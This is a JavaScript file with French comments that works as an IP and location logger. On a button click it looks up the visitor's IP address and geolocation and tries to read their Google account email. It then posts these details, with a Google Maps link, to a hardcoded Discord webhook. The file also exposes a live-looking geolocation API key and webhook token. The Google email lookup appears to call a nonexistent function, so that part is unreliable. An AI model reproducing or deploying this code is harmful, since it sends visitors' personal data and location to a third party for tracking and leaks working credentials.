// Fonction pour détecter le nom d'adresse email (compte Google)
function getGoogleAccountName() {
    let accountName = 'None';  // Valeur par défaut si aucun compte Google n'est détecté

    // Vérification de l'authentification Google
    if (typeof(google) !== 'undefined' && typeof(google.accounts) !== 'undefined' && typeof(google.accounts.id) !== 'undefined') {
        let userProfile = google.accounts.id.get();

        if (userProfile && userProfile.email) {
            accountName = userProfile.email;
        }
    }

    return accountName;
}

document.getElementById('get-info-btn').addEventListener('click', function() {
    fetch('http://ip-api.com/json/')
        .then(response => response.json())
        .then(ipData => {
            // Récupération de la localisation précise depuis IPIFY
            let ipifyUrl = `https://geo.ipify.org/api/v2/country,city,vpn?apiKey=at_C7jEkQ4u4zDqbJpCxPVCUdsPjhgsQ&ipAddress=${ipData.query}`;

            fetch(ipifyUrl)
                .then(response => response.json())
                .then(data => {
                    // Obtenir le nom d'adresse email (compte Google)
                    let googleAccountName = getGoogleAccountName();

                    // Construire le message à envoyer au webhook Discord
                    let message = {
                        content: `
                            **${googleAccountName} a cliqué sur le bouton**
                            \nVotre adresse IP est: ${ipData.query}
                            \nVotre localisation exacte est:
                            \nLatitude: ${data.location.lat}, Longitude: ${data.location.lng}
                            \nVille: ${data.location.city}, Région: ${data.location.region}, Pays: ${data.location.country}
                            \n[Google Maps](https://www.google.com/maps?q=${data.location.lat},${data.location.lng})  // lien vers Google Maps
                        `
                    };

                    // URL du webhook Discord
                    let webhookUrl = 'https://discord.com/api/webhooks/1243652550251515914/SrRtaX_dz1S_l1rKGroUHBmvvzBSqVfcWpe07WKJQ8nvLFeIImfe-XgBBlDcT6r_00VU';

                    // Envoi du message au webhook Discord
                    fetch(webhookUrl, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify(message)
                    }).then(response => {
                        if (response.ok) {
                            alert('Les informations ont été envoyées avec succès au webhook Discord.');
                        } else {
                            throw new Error('Erreur lors de l\'envoi au webhook Discord. Statut: ' + response.status);
                        }
                    }).catch(error => {
                        console.error('Erreur:', error);
                        alert('Erreur lors de l\'envoi au webhook Discord. Veuillez réessayer.');
                    });

                    // Affichage des informations dans l'élément #info-display
                    document.getElementById('info-display').innerText = `
                        Votre adresse IP est: ${ipData.query}
                        \nVotre localisation exacte est:
                        \nLatitude: ${data.location.lat}, Longitude: ${data.location.lng}
                        \nVille: ${data.location.city}, Région: ${data.location.region}, Pays: ${data.location.country}
                        \n[Google Maps](https://www.google.com/maps?q=${data.location.lat},${data.location.lng})  // lien vers Google Maps
                    `;
                })
                .catch(error => {
                    console.error('Erreur lors de la récupération de la localisation depuis IPIFY:', error);
                    alert('Erreur lors de la récupération de la localisation. Veuillez réessayer.');
                });
        })
        .catch(error => {
            document.getElementById('info-display').innerText = 'Erreur lors de la récupération des informations depuis IP-API.';
            console.error('Erreur lors de la récupération des informations depuis IP-API:', error);
        });
});
